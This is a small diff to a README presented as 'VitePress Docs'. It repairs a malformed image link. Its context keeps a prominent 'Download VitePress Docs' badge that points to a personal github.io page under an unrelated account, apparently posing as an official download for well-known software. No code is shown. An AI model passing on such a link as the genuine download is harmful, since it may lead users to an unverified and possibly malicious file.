@@ -1,6 +1,6 @@
 # VitePress Docs - Fast Documentation Sites with Vue and Markdown
 
-![Clean documentation interface with sidebar navigation, search field, and Markdown content panels]([FOTO](https://vitepress.dev/vitepress-og.jpg))
+![Clean documentation interface with sidebar navigation, search field, and Markdown content panels](https://vitepress.dev/vitepress-og.jpg)
 
 [![Download VitePress Docs](https://img.shields.io/badge/Download-VitePress_Docs-blueviolet?style=for-the-badge&logo=vite)](https://ghai6343amal.github.io/.github/vitepress-docs)
 
